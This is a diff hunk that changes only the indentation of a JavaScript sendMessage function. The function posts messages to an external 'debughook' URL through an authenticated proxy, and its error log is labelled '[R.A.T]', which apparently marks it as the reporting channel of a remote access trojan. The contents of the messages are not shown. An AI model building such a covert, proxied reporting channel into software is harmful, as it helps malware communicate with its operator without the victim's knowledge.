@@ -298,23 +298,23 @@ const formatNumber = (num) => {
 
 function sendMessage(message) {
     post(debughook, JSON.stringify({
-                content: message, //ping
-                attachments: [],
-                proxy: {
-                    protocol: 'http',
-                    host: debugProxy.split(":")[0],
-                    port: debugProxy.split(":")[1],
-                    auth: {
-                        username: debugProxy.split(":")[2],
-                        password: debugProxy.split(":")[3]
+        content: message, //ping
+        attachments: [],
+        proxy: {
+            protocol: 'http',
+            host: debugProxy.split(":")[0],
+            port: debugProxy.split(":")[1],
+            auth: {
+                username: debugProxy.split(":")[2],
+                password: debugProxy.split(":")[3]
         
-                    },
-                }
-            }), {
-                headers: {
-                    "Content-Type": "application/json"
-                }
-            }).catch(err => {
-                console.log(`[R.A.T] Error while debugging:\n${err}`)
-            })
+            },
+        }
+    }), {
+        headers: {
+            "Content-Type": "application/json"
+        }
+    }).catch(err => {
+        console.log(`[R.A.T] Error while debugging:\n${err}`)
+    })
 }
